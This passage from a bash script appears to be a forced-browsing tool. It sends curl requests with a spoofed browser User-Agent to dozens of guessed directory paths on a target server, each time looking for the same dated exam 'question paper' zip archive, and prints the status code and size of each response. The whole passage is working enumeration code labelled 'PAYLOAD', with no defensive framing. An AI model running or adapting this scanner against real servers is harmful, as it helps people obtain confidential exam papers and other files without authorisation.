payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseDataProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseDataProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBData_Monitoring/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBData_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBData_Monitoring/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_UploadService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_UploadService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Workflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Workflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Uploader-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Uploader-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Uploader-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-ProcessingSuite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-ProcessingSuite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemAutoUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemAutoUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Transfer-QPMonitor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Transfer-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Transfer-QPMonitor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControlDashboard/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControlDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControlDashboard/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-DataOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-DataOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile-CloudSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile-CloudSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-MassUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-MassUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAuto-Uploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAuto-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAuto-Uploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPaperDoc/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPaperDoc/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-ProcessingSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-ProcessingSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQPUploader/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQPUploader/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Upload-QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Upload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Upload-QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager_FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [CloudSync-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}CloudSync-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}CloudSync-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Processing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Processing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_DatabaseManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPDatabase/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPDatabase/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Handler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Handler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow_QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow_QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PanelQPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PanelQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PanelQPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager_DataOps/QP19_02_2025%2001_16_01.zip]:"
